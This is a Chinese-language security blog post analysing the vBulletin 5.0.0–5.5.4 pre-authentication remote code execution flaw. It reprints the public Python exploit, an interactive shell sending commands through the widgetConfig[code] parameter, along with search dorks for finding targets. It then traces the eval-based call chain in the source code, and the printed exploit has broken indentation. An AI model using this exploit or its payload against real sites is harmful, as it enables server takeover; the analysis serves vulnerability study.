---
title: vBulletin5 RCE
author: cotes
date: 2019-10-08 11:33:00 +0800
categories: [vulnerability, vBulletin5]
tags: [RCE]
pin: false
math: true
mermaid: true
---

## Preface

RCE漏洞PoC被公开，该漏洞利用简单，可以直接在受害者服务中执行php代码。影响Vbulletin5.0.0至5.5.4版本，国外使用的较多。

PoC如下：

```python
#!/usr/bin/python
#
# vBulletin 5.x 0day pre-auth RCE exploit
# 
# This should work on all versions from 5.0.0 till 5.5.4
#
# Google Dorks:
# - site:*.vbulletin.net
# - "Powered by vBulletin Version 5.5.4"

import requests
import sys

if len(sys.argv) != 2:
  sys.exit("Usage: %s <URL to vBulletin>" % sys.argv[0])

params = {"routestring":"ajax/render/widget_php"}

while True:
  try:
    cmd = raw_input("vBulletin$ ")
    params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"
    r = requests.post(url = sys.argv[1], data = params)
    if r.status_code == 200:
      print r.text
      else:
      sys.exit("Exploit failed! :(")
except KeyboardInterrupt:
sys.exit(" nClosing shell...")
except Exception, e:
sys.exit(str(e))
```

## Analysis

本次使用的版本为5.4.5，26日有人发布了一个临时补丁 链接：https://gist.github.com/nickcano/4b8dbc93c463f9e2c983d03ceae61774

```php
   function evalCode($code)
   {
       ob_start();
       // comment out. idk what it breaks but it's a fix for now
       //eval($code);
       $output = ob_get_contents();
       ob_end_clean();
       return $output;
   }
```
evalCode函数位于 `includes/vb5/frontend/controller/bbcode.php` 中作为 `vB5_Frontend_Controller_Bbcode`类的一个方法存在。
可以看到把 `eval($code)`给注释了，证明这里是漏洞的触发点。在看一下payload，POST提交了一下参数：
```shell
routestring=ajax/render/widget_php
widgetConfig[code]=echo shell_exec('cmd'); exit;
```
将上述数据提交到index.php，vbulletin会创建app对象来进行处理。

```php
 //For a few set routes we can run a streamlined function.
   if (vB5_Frontend_ApplicationLight::isQuickRoute())
   {
       $app = vB5_Frontend_ApplicationLight::init('config.php');
       vB5_Frontend_ExplainQueries::initialize();
       if ($app->execute())
       {
           vB5_Frontend_ExplainQueries::finish();
           exit();
       }
   }
```

在调用`isQuickRoute`静态方法检查是否可以处理快路由后，创建出通过加载`config.php` vB5_Frontend_ApplicationLight的对象。

isQuickRoute 中检查了当前路由，我们输入的 routestring=ajax/render/widget_php 刚好满足条件返回True。
```php 
   foreach (self::$quickRoutePrefixMatch AS $prefix => $route)
   {
       if (substr($_REQUEST['routestring'], 0, strlen($prefix)) == $prefix)
       {
           return true;
       }
   }

   // ++++++++另一部分+++++++
   protected static $quickRoutePrefixMatch = array(
       'ajax/apidetach' => array(
           'handler'     => 'handleAjaxApiDetached',
           'static'      => false,
           'requirePost' => true,
       ), // note, keep this before ajax/api. More specific routes should come before
       // less specific ones, to allow the prefix check to work correctly, see constructor.
       'ajax/api' => array(
           'handler'     => 'handleAjaxApi',
           'static'      => false,
           'requirePost' => true,
       ),
       'ajax/render' => array(
           'handler'     => 'callRender',
           'static'      => false,
           'requirePost' => true,
       ),
   );
```
来到 `execute` 中,以下代码解释了为什么需要POST提交payload。并且可以看到 `$this->application['handler']` 此时为 callRender 方法

```php 
   // vB5_Frontend_ApplicationLight 类构造方法部分代码

   foreach (self::$quickRoutePrefixMatch AS $prefix => $route)
   {
       if (substr($_REQUEST['routestring'], 0, strlen($prefix)) == $prefix)
       {
           $this->application = $route;
           return true;
       }
   }


   // execute 方法部分代码
   if ($this->application['requirePost'])
   {
       if (strtoupper($_SERVER['REQUEST_METHOD']) !== 'POST')
       {
           throw new vB5_Exception('Incorrect HTTP Method. Please use a POST request.');
       }
       // Also require a CSRF token check.
       static::checkCSRF();
   }
   $serverData = array_merge($_GET, $_POST);
   if (!empty($this->application['handler']) AND method_exists($this, $this->application['handler']))
   {
       $app = $this->application['handler'];
       call_user_func(array($this, $app), $serverData);
       return true;
   }
```
然后将payload，通过调用 `includes vb5 template.php`， `Template`中`staticRenderAjax` 静态方法传入。
```php
$this->sendAsJson(vB5_Template::staticRenderAjax($routeInfo[2], $serverData));
```

之后来到 vB5_Template 的 render 方法，通过 extract 方法将传入的数据添加之当前的符号表中，也就是说创建了一个名为 widgetConfig[code] 的变量，值为 echo shell_exec('cmd'); exit; 。之后加载模板进行渲染，在下面代码中使用eval执行模板

```php
   if(is_array($templateCode) AND !empty($templateCode['textonly']))
   {
       $final_rendered = $templateCode['placeholder'];
   }
   else if($templateCache->isTemplateText())
   {
       eval($templateCode);
   }
```
生成的模板为
```php
   <?php
   $final_rendered = '' . ''; if (empty($widgetConfig) AND !empty($widgetinstanceid)) {
       $final_rendered .= '
       ' . ''; $widgetConfig = vB5_Template_Runtime::parseData('widget', 'fetchConfig', $widgetinstanceid); $final_rendered .= '' . '
   ';
   } else {
       $final_rendered .= '';
   }$final_rendered .= '' . '
   ' . ''; if (!empty($widgetConfig)) {
       $final_rendered .= '
       ' . ''; $widgetid = $widgetConfig['widgetid']; $final_rendered .= '' . '
       ' . ''; $widgetinstanceid = $widgetConfig['widgetinstanceid']; $final_rendered .= '' . '
   ';
   } else {
       $final_rendered .= '';
   }$final_rendered .= '' . '

   <div class="b-module' . vB5_Template_Runtime::vBVar($widgetConfig['show_at_breakpoints_css_classes']) . ' canvas-widget default-widget custom-html-widget" id="widget_' . $widgetinstanceid . '" data-widget-id="' . $widgetid . '" data-widget-instance-id="' . $widgetinstanceid . '">

       ' . vB5_Template_Runtime::includeTemplate('module_title',array('widgetConfig' => $widgetConfig, 'show_title_divider' => '1', 'can_use_sitebuilder' => $user['can_use_sitebuilder'])) . '

       <div class="widget-content">
           ' . ''; if (!empty($widgetConfig['code']) AND !vB::getDatastore()->getOption('disable_php_rendering')) {
       $final_rendered .= '
               ' . ''; $evaledPHP = vB5_Template_Runtime::parseAction('bbcode', 'evalCode', $widgetConfig['code']); $final_rendered .= '' . '
               ' . $evaledPHP . '
           ';
   } else {
       $final_rendered .= '
               ' . ''; if ($user['can_use_sitebuilder']) {
           $final_rendered .= '
                   <span class="note">' . vB5_Template_Runtime::parsePhrase("click_edit_to_config_module") . '</span>
               ';
       } else {
           $final_rendered .= '';
       }$final_rendered .= '' . '
           ';
   }$final_rendered .= '' . '
       </div>
   </div>';
```
其中部分代码中可以看到 widgetConfig['code'] 被执行，通过 vB5_Template_Runtime 的静态方法parseAction 调用vB5_Frontend_Controller_Bbcode中的evalCode方法，payload得到执行。
```php
$evaledPHP = vB5_Template_Runtime::parseAction('bbcode', 'evalCode', $widgetConfig['code']);

```
```php
   public static function parseAction()
   {
       $arguments = func_get_args();
       $controller = array_shift($arguments);
       $method = array_shift($arguments);
       $controller = str_replace(':', '.', $controller);
       $class = vB5_Frontend_Routing::getControllerClassFromName($controller);
       if (!class_exists($class) || !method_exists($class, $method))
       {
           return null;
       }
       $result =  call_user_func_array(array($class, $method), $arguments);
           return $result;
   }
```

整个调用栈如下:

* vB5_Frontend_Controller_Bbcode 执行 evalCode，其中eval执行代码
* vB5_Template_Runtime 中执行parseAction方法，调用vB5_Frontend_Controller_Bbcode
* vB5_Template 中render方法通过eval执行模板代码
* vB5_Template staticRenderAjax 调用 staticRender 调用 render
* vB5_Frontend_ApplicationLight中calllRender调用vB5_Template中staticRenderAjax
* vB5_Frontend_ApplicationLight中execute 调用calllRender
* index.php 调用vB5_Frontend_ApplicationLight中execute方法

## Reference
[1] https://gist.github.com/nickcano/4b8dbc93c463f9e2c983d03ceae61774

[2] https://seclists.org/fulldisclosure/2019/Sep/31
